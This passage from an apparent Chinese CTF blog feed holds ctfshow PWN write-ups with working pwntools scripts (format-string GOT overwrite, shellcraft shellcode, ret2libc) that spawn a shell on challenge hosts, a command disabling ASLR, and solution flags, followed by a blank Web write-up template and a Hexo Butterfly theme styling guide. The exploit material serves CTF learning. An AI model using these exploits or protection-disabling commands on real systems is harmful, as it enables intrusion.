class="line">}</span><br></pre></td></tr></tbody></table></figure><p>跟进菜单：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Choose an option:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.Crash the program"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Stack data breaches"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.Arbitrary address memory leak"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Stack data override"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Arbitrary address memory override"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"6. ... "</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>获取flag的地方在case 7 exit0()函数，跟进后发现其实是一个后门函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">exit0</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>也就是说读取用户输入的时候输入7即可获得flag。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28242</span>) </span><br><span class="line">io.sendline(<span class="string">'7'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="33-pwn94"><a href="#33-pwn94" class="headerlink" title="33 pwn94"></a>33 pwn94</h2><p>🚩flag：<code>ctfshow{cc14b02c-70f9-461e-aa67-96516a0834a0}</code></p><p>💡hint：<code>格式化字符串</code></p><p>好了，你已经学会1+1=2了，接下来继续加油吧</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>跟进ctfshow()：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x64u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>进入一个循环，然后其中有明显的格式化字符串漏洞， 看到程序中有system函数，还是可以用格式化字符串漏洞任意写的，将printf_got 指针指向的地址改为 system_plt，再printf(),就相当于 system()了，如果我们再发送 “/bin/sh\x00”,作为其参数,就能getshell了。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = process('./fmt')</span></span><br><span class="line">io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>) </span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>] </span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,{printf_got:system_plt}) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><blockquote><p>34~37为堆管理器</p></blockquote><h2 id="34-pwn135"><a href="#34-pwn135" class="headerlink" title="34 pwn135"></a>34 pwn135</h2><p>🚩flag：<code>ctfshow{6f51b075-d479-4231-aada-f294823c75fc}</code></p><p>💡hint：<code>堆管理器</code></p><p><strong><code>malloc</code>、<code>calloc</code>、<code>realloc</code> 的作用</strong></p><table><thead><tr><th>函数</th><th>作用</th><th>关键区别</th></tr></thead><tbody><tr><td><strong><code>malloc(size)</code></strong></td><td>分配 <code>size</code> 字节的<strong>未初始化内存</strong>，内容随机（可能含敏感数据）。</td><td>最快，但需手动初始化。</td></tr><tr><td><strong><code>calloc(n, size)</code></strong></td><td>分配 <code>n * size</code> 字节的<strong>初始化为零的内存</strong>（适合数组/结构体）。</td><td>比 <code>malloc</code> 慢，但安全。</td></tr><tr><td><strong><code>realloc(ptr, new_size)</code></strong></td><td><strong>调整已分配内存块的大小</strong>（可扩大/缩小），原数据保留（新部分未初始化）。</td><td>若 <code>ptr</code> 为 <code>NULL</code>，等价于 <code>malloc</code>。</td></tr></tbody></table><p><strong>一句话总结</strong>：<br><code>malloc</code> 分配未初始化内存，<code>calloc</code> 分配并清零内存，<code>realloc</code> 调整已有内存块大小。</p><p>本题输入4拿到flag。</p><hr><h2 id="35-pwn136"><a href="#35-pwn136" class="headerlink" title="35 pwn136"></a>35 pwn136</h2><p>🚩flag：<code>ctfshow{bc477bcf-c4ce-4e20-870e-72aa123b7703}</code></p><p>💡hint：<code>堆管理器</code></p><p>如何释放堆？</p><blockquote><h3 id="free堆块的原理"><a href="#free堆块的原理" class="headerlink" title="free堆块的原理"></a><strong>free堆块的原理</strong></h3><p>当调用 <code>free(ptr)</code> 时，堆管理器会执行以下操作：</p><ol><li><strong>检查指针有效性</strong>：确保 <code>ptr</code> 是由 <code>malloc</code>/<code>calloc</code>/<code>realloc</code> 分配的合法地址，防止双重释放（Double Free）或非法释放。</li><li><strong>标记为未使用</strong>：将该内存块标记为 <code>free</code> 状态（通常通过修改块头部的元数据，如 <code>size</code> 和 <code>in_use</code> 标志位）。</li><li><strong>合并空闲块</strong>：若相邻内存块也是空闲的，合并它们以减少碎片（<code>coalescing</code>）。</li><li><strong>加入空闲链表</strong>：将释放的块插入 <code>free list</code>（如 <code>glibc</code> 的 <code>bin</code>），供后续 <code>malloc</code> 重用，可能触发 <code>brk</code>/<code>mmap</code>调整堆空间。</li></ol><p><strong>关键点</strong>：<code>free</code> 不会立即归还内存给操作系统，而是由堆管理器缓存复用，存在 <strong>Use-After-Free (UAF)</strong> 漏洞风险。</p></blockquote><p>输入4获得flag。</p><hr><h2 id="36-pwn137"><a href="#36-pwn137" class="headerlink" title="36 pwn137"></a>36 pwn137</h2><p>🚩flag：<code>ctfshow{31e71893-ad61-424b-85d7-c3e01878746d}</code></p><p>💡hint：<code>堆管理器</code></p><p>sbrk and brk example</p><blockquote><p><code>sbrk()</code> 和 <code>brk()</code> 是用于管理堆内存的系统调用，**<code>brk()</code> 直接设置堆的结束地址（<code>break</code>指针）到指定位置<strong>，从而扩展或收缩堆空间；</strong><code>sbrk()</code> 则是相对调整，通过增量（正数扩展、负数收缩）移动 <code>break</code> 指针**，并返回调整前的地址。两者共同维护堆的动态内存分配，<code>malloc</code> 等库函数底层依赖它们操作内存，但过度碎片化可能导致性能问题。</p></blockquote><hr><h2 id="37-pwn138"><a href="#37-pwn138" class="headerlink" title="37 pwn138"></a>37 pwn138</h2><p>🚩flag：<code>ctfshow{3c16a2a8-a843-4cae-9eab-511d82ed8f09}</code></p><p>💡hint：<code>堆管理器</code></p><p>Private anonymous mapping example</p><p>当用户申请内存过大时，ptmalloc2会选择通过<strong>mmap</strong>()函数创建匿名映射段供用户使用，并通过<strong>unmmap</strong>()函数进行回收。</p><blockquote><p>当用户申请的内存超过 <code>mmap_threshold</code>（默认 128KB，可通过 <code>mallopt</code> 调整）时，<code>ptmalloc2</code> 会绕过堆区管理，直接调用 <strong><code>mmap()</code></strong> 创建独立的匿名内存映射段（无文件关联，权限为可读写），该段与堆区隔离，减少碎片化影响；释放时调用 <strong><code>munmap()</code></strong> 立即将内存归还操作系统，避免堆缓存带来的延迟或内存泄漏风险。这种机制适合大块内存分配，但频繁使用可能引发缺页中断开销，且地址随机化（ASLR）会降低局部性效率。</p></blockquote><hr><h2 id="38-pwn24"><a href="#38-pwn24" class="headerlink" title="38 pwn24"></a>38 pwn24</h2><p>🚩flag：<code>ctfshow{f615f3c6-b99a-4590-ac95-1f7baf5b974b}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>你可以使用pwntools的shellcraft模块来进行攻击</p><blockquote><p><strong>pwntools的shellcraft模块</strong>是一个用于快速生成各种架构（如x86、ARM、MIPS等）的shellcode的工具库，它提供了预定义的汇编代码片段（如执行<code>/bin/sh</code>、系统调用、文件读写等），用户可通过简单调用（如<code>shellcraft.sh()</code>）自动适配目标平台，无需手动编写底层汇编。其核心作用是<strong>简化漏洞利用开发</strong>，尤其在栈溢出、ROP攻击等场景中，能一键生成可靠的逆向Shell、反弹Shell或权限提升代码，支持动态调整参数（如寄存器、系统调用号），并自动处理字节对齐和NULL字节过滤，大幅提升PWN题或真实漏洞利用的效率与可移植性。</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>, <span class="number">28112</span>) </span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>32位仅部分开启RELRO保护</p><p>可以看到存在一个RWX权限的段，即可读可写可执行的段</p><p>直接IDA查看main函数发现有一个ctfshow函数，但是无法跟进 那么就直接看汇编了：</p><ol><li>函数开始时进行一些栈操作，保存寄存器的值。</li><li>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</li><li>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</li><li>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</li><li>调用 puts 函数，将缓冲区的内容打印到标准输出。</li><li>通过调用 call eax 指令，以  eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执 行。</li><li>之后是一些清理工作和函数返回的准备操作。</li></ol><p>这题题目提示了可以使用 pwntools的shellcraft模块进行攻击</p><p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。 Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p><p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                 <span class="comment"># 导入  pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span>                      <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process('./pwn')                           # 本地连接 io = remote("pwn.challenge.ctf.show", 28112)     # 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh())                 <span class="comment"># 生成一个  Shellcode</span></span><br><span class="line">io.sendline(shellcode)                           <span class="comment"># 将生成的  Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive()                                 <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="39-pwn25"><a href="#39-pwn25" class="headerlink" title="39 pwn25"></a>39 pwn25</h2><p>🚩flag：<code>ctfshow{3a6ba94e-fcd7-4427-be46-28c0402728a7}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>开启NX保护，或许可以试试ret2libc</p><blockquote><h3 id="NX保护（No-eXecute）"><a href="#NX保护（No-eXecute）" class="headerlink" title="NX保护（No-eXecute）"></a><strong>NX保护（No-eXecute）</strong></h3><p>NX保护是一种内存保护机制，由CPU和操作系统共同实现，<strong>通过将数据段（如栈、堆）标记为不可执行</strong>（<code>READ/WRITE</code>但无<code>EXECUTE</code>权限），阻止攻击者在这些区域直接执行恶意代码（如shellcode）。其核心目的是防御栈溢出等漏洞利用技术，迫使攻击者转向更复杂的利用方式（如ROP）。现代编译器默认开启NX（通过<code>-z noexecstack</code>选项），可用<code>checksec</code>工具检测程序是否启用该保护。</p><hr><h3 id="ret2libc（Return-to-libc）"><a href="#ret2libc（Return-to-libc）" class="headerlink" title="ret2libc（Return-to-libc）"></a><strong>ret2libc（Return-to-libc）</strong></h3><p>ret2libc是一种绕过NX保护的漏洞利用技术，<strong>通过覆盖返回地址跳转到libc库中的函数</strong>（如<code>system</code>、<code>execve</code>），而非直接执行shellcode。攻击步骤通常为：1) 泄露libc基地址（利用<code>puts</code>或<code>printf</code>）；2) 计算目标函数（如<code>system("/bin/sh")</code>）的真实地址；3) 构造ROP链调用该函数。这种技术依赖程序动态链接libc的特性，无需注入代码，但需处理地址随机化（ASLR）和参数传递问题。</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别和架构</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>, <span class="number">28233</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次payload：泄露write函数的真实地址</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"write address:"</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用LibcSearcher查找匹配的libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次payload：调用system("/bin/sh")</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交互式shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="40-pwn-26"><a href="#40-pwn-26" class="headerlink" title="40 pwn 26"></a>40 pwn 26</h2><p>🚩flag：<code>ctfshow{3a6ba94e-fcd7-4427-be46-28c0402728a7}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>设置好 ASLR 保护参数值即可获得flag</p><p>为确保flag正确，本题建议用提供虚拟机运行</p><p><a href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA">libc下载地址</a></p><p>提取码为： <strong>show</strong></p><blockquote><p><strong>ASLR（Address Space Layout Randomization，地址空间布局随机化）</strong>是一种安全防护机制，由操作系统在程序运行时<strong>动态随机化内存布局</strong>（如栈、堆、libc库的基地址），使得攻击者难以预测关键数据或代码的绝对地址（如<code>system</code>函数、<code>/bin/sh</code>字符串），从而阻止基于固定地址的漏洞利用（如栈溢出、ROP链）。ASLR通过增加攻击者定位目标的难度，有效防御大多数内存攻击，但若结合信息泄露漏洞（如格式化字符串、UAF）获取随机化后的地址，仍可能被绕过。现代操作系统（如Linux、Windows）默认全局开启ASLR，可通过<code>cat /proc/sys/kernel/randomize_va_space</code>查看配置（<code>2</code>表示完全启用）。</p></blockquote><blockquote><p>可以将该文件的值设置为以下几个选项之一来控制 ASLR 的行为：</p><ul><li>0：关闭 ASLR，内存布局不随机化。</li><li>1：启用 ASLR，但只有堆和栈是随机化的。</li><li>2：启用完整的 ASLR，所有内存段（包括堆、栈、共享库等）都是随机化的。</li></ul></blockquote><p>使用命令设置 ASLR 的级别 ：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0"</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></tbody></table></figure><p>flag is ：ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0} </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[CTF][Web] 题目名称</title>
      <link href="/2026/01/29/CTF%E9%A2%98%E8%A7%A3%E6%A8%A1%E6%9D%BF/"/>
      <url>/2026/01/29/CTF%E9%A2%98%E8%A7%A3%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="一、题目信息"><a href="#一、题目信息" class="headerlink" title="一、题目信息"></a>一、题目信息</h2><ul><li>比赛 / 平台：</li><li>题目类型：Web</li><li>难度（主观）：</li><li>是否独立完成：是 / 否</li></ul><hr><h2 id="二、环境-入口"><a href="#二、环境-入口" class="headerlink" title="二、环境 &amp; 入口"></a>二、环境 &amp; 入口</h2><ul><li>环境：Docker / 远程 / 本地</li><li>访问地址：</li><li>初始功能点：<ul><li>登录</li><li>文件上传</li><li>查询接口</li><li>其他：</li></ul></li></ul><hr><h2 id="三、我的第一反应（非常重要）"><a href="#三、我的第一反应（非常重要）" class="headerlink" title="三、我的第一反应（非常重要）"></a>三、我的第一反应（非常重要）</h2><blockquote><p><strong>看到题目的第一直觉</strong></p></blockquote><ul><li>第一眼我觉得这是在考：</li><li>我最先尝试了：</li><li>当时的判断是否正确：</li></ul><p>（哪怕是错的，也一定要写）</p><hr><h2 id="四、分析过程（核心）"><a href="#四、分析过程（核心）" class="headerlink" title="四、分析过程（核心）"></a>四、分析过程（核心）</h2><h3 id="1️⃣-我做了哪些尝试"><a href="#1️⃣-我做了哪些尝试" class="headerlink" title="1️⃣ 我做了哪些尝试"></a>1️⃣ 我做了哪些尝试</h3><ul><li>尝试了什么 payload / 操作</li><li>哪些是无效的</li><li>哪一步开始有反馈</li></ul><h3 id="2️⃣-关键线索"><a href="#2️⃣-关键线索" class="headerlink" title="2️⃣ 关键线索"></a>2️⃣ 关键线索</h3><ul><li>可控参数：</li><li>异常回显：</li><li>源码 / 前端 JS 线索：</li></ul><hr><h2 id="五、突破点"><a href="#五、突破点" class="headerlink" title="五、突破点"></a>五、突破点</h2><blockquote><p><strong>真正打开局面的地方</strong></p></blockquote><ul><li>是哪一个点让我意识到方向对了？</li><li>为什么之前没想到？</li><li>这个点本质在考什么能力？</li></ul><hr><h2 id="六、解题思路（简化版）"><a href="#六、解题思路（简化版）" class="headerlink" title="六、解题思路（简化版）"></a>六、解题思路（简化版）</h2><blockquote><p>不追求“标准”，只写你能复盘的版本</p></blockquote><ol><li>做了什么</li><li>利用了什么漏洞</li><li>最终结果</li></ol><p>（可附关键 payload，但不强制）</p><hr><h2 id="七、知识点总结"><a href="#七、知识点总结" class="headerlink" title="七、知识点总结"></a>七、知识点总结</h2><ul><li>新学到的知识点：</li><li>不熟但必须补的内容：</li><li>相关关键词：</li></ul><hr><h2 id="八、复盘（比题解更重要）"><a href="#八、复盘（比题解更重要）" class="headerlink" title="八、复盘（比题解更重要）"></a>八、复盘（比题解更重要）</h2><ul><li>这题暴露了我哪些问题？</li><li>是知识盲区，还是经验不足？</li><li>如果重来一次，我会怎么做？</li></ul><hr><h2 id="九、延伸-TODO"><a href="#九、延伸-TODO" class="headerlink" title="九、延伸 &amp; TODO"></a>九、延伸 &amp; TODO</h2><ul><li>类似题型：</li><li>推荐复现的题：</li><li>需要补的基础知识：</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql-injection </tag>
            
            <tag> xss </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极简风美化教程</title>
      <link href="/2026/01/29/%E6%9E%81%E7%AE%80%E9%A3%8E%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/29/%E6%9E%81%E7%AE%80%E9%A3%8E%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Butterfly-极简风美化教程（内容优先｜功能性｜舒适耐看）"><a href="#Butterfly-极简风美化教程（内容优先｜功能性｜舒适耐看）" class="headerlink" title="Butterfly 极简风美化教程（内容优先｜功能性｜舒适耐看）"></a>Butterfly 极简风美化教程（内容优先｜功能性｜舒适耐看）</h1><blockquote><p>目标：把 Hexo + Butterfly 调成 <strong>“极简、内容优先、功能齐全但不花哨”</strong> 的状态。<br>核心原则：<strong>少动效、少噪音、少装饰；高可读、高一致性、高维护性</strong>。</p></blockquote><hr><h2 id="1-极简风的“设计准则”（先定方向再改配置）"><a href="#1-极简风的“设计准则”（先定方向再改配置）" class="headerlink" title="1. 极简风的“设计准则”（先定方向再改配置）"></a>1. 极简风的“设计准则”（先定方向再改配置）</h2><p>极简不等于“什么都关掉”，而是把视觉注意力交还给内容：</p><ul><li><strong>降低干扰</strong>：打字机字幕、背景特效、花里胡哨的脚本能不用就不用</li><li><strong>提升阅读体验</strong>：字体、行距、段落间距、代码块、引用块、目录</li><li><strong>信息密度适中</strong>：首页摘要不要太长；侧边栏不要堆满小组件</li><li><strong>性能与稳定性</strong>：减少外链 JS、避免重复依赖（例如多余的 jQuery）</li></ul><hr><h2 id="2-你当前配置里，最影响“极简”的点（建议优先处理）"><a href="#2-你当前配置里，最影响“极简”的点（建议优先处理）" class="headerlink" title="2. 你当前配置里，最影响“极简”的点（建议优先处理）"></a>2. 你当前配置里，最影响“极简”的点（建议优先处理）</h2><p>结合你贴出来的 <code>_config.butterfly.yml</code> 片段，最值得先动手的有：</p><ol><li><strong>顶部大图过强</strong>：你几乎所有页面都用同一张 <code>background2.jpg</code>，视觉占比很高  </li><li><strong>首页字幕打字机</strong>：动效会抢注意力（你追求内容优先）  </li><li><strong>外链特效脚本</strong>：<code>jquery + fishes.js</code> 属于“装饰性强、功能性弱”，且会增加不稳定因素  </li><li><strong>首页摘要 500 字太长</strong>：内容密度过大，浏览成本更高  </li><li><strong>侧边栏卡片偏多</strong>：可以保留功能，但需要“减法”和“更合理的排序”</li></ol><hr><h2 id="3-推荐的整体策略（最少改动，效果最大）"><a href="#3-推荐的整体策略（最少改动，效果最大）" class="headerlink" title="3. 推荐的整体策略（最少改动，效果最大）"></a>3. 推荐的整体策略（最少改动，效果最大）</h2><h3 id="3-1-顶部大图策略：弱化-只在首页保留"><a href="#3-1-顶部大图策略：弱化-只在首页保留" class="headerlink" title="3.1 顶部大图策略：弱化 / 只在首页保留"></a>3.1 顶部大图策略：弱化 / 只在首页保留</h3><p>极简风里，<strong>顶部图可以有，但不要处处都是同一张大背景</strong>：</p><ul><li>首页：可以保留一张轻量、低对比的图（或渐变色）</li><li>文章页：建议 <strong>关闭 top_img</strong>（阅读更聚焦）</li><li>分类/标签/归档页：可使用纯色/渐变，降低视觉噪音</li></ul><p><strong>推荐做法 A：全站关闭 top_img（最极简）</strong></p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">disable_top_img:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">````</span></span><br><span class="line"></span><br><span class="line"><span class="string">**推荐做法</span> <span class="string">B：保留首页，文章页关闭（折中）**</span></span><br><span class="line"></span><br><span class="line"><span class="string">*</span> <span class="string">主题配置保留</span> <span class="string">`index_img`</span></span><br><span class="line"><span class="string">*</span> <span class="string">在文章</span> <span class="string">Front-matter</span> <span class="string">里写：</span></span><br><span class="line"></span><br><span class="line"><span class="string">```yml</span></span><br><span class="line"><span class="attr">top_img:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>你如果担心逐篇加很麻烦：可以写一个“默认规则”，以后新文章模板里就带 <code>top_img: false</code>（详见第 7 节）。</p></blockquote><hr><h2 id="4-一份“极简取向”的关键配置（可直接改）"><a href="#4-一份“极简取向”的关键配置（可直接改）" class="headerlink" title="4. 一份“极简取向”的关键配置（可直接改）"></a>4. 一份“极简取向”的关键配置（可直接改）</h2><p>下面是一组“建议值”。你不需要一次全改完，按顺序做即可。</p><h3 id="4-1-导航栏：固定-简洁（功能性更强）"><a href="#4-1-导航栏：固定-简洁（功能性更强）" class="headerlink" title="4.1 导航栏：固定 + 简洁（功能性更强）"></a>4.1 导航栏：固定 + 简洁（功能性更强）</h3><p>你目前 <code>nav.fixed: false</code>。极简站点更强调可用性，建议改成固定：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p>菜单建议保留你现有结构，但可以考虑：</p><ul><li>“生活”下的内容如果访问率不高，隐藏到二级页或减少入口</li><li>“留言板 / 关于”保留</li><li>把“搜索”入口放到明显位置（你已经启用 local_search）</li></ul><hr><h3 id="4-2-首页：减少信息噪音（摘要更短、布局更稳定）"><a href="#4-2-首页：减少信息噪音（摘要更短、布局更稳定）" class="headerlink" title="4.2 首页：减少信息噪音（摘要更短、布局更稳定）"></a>4.2 首页：减少信息噪音（摘要更短、布局更稳定）</h3><p>你当前：</p><ul><li><code>index_layout: 3</code>（左右交错）</li><li><code>index_post_content.length: 500</code>（太长）</li></ul><p>极简更推荐“稳定、规律”的布局与更短摘要：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">index_layout:</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index_post_content:</span></span><br><span class="line">  <span class="attr">method:</span> <span class="number">2</span>      <span class="comment"># 优先 description，没有就用自动摘要</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">180</span>    <span class="comment"># 120~220 都可以，看你文章风格</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>小技巧：重要文章手动写 <code>description</code>，首页展示会更精致、更可控。</p></blockquote><hr><h3 id="4-3-首页字幕：建议改为静态（减少注意力抢夺）"><a href="#4-3-首页字幕：建议改为静态（减少注意力抢夺）" class="headerlink" title="4.3 首页字幕：建议改为静态（减少注意力抢夺）"></a>4.3 首页字幕：建议改为静态（减少注意力抢夺）</h3><p>你目前打字机效果开启且循环。极简风建议关闭动效，只保留一句静态副标题：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">source:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sub:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"写清楚，比写热闹更重要"</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-4-右下角按钮：保留功能，但更“干净”"><a 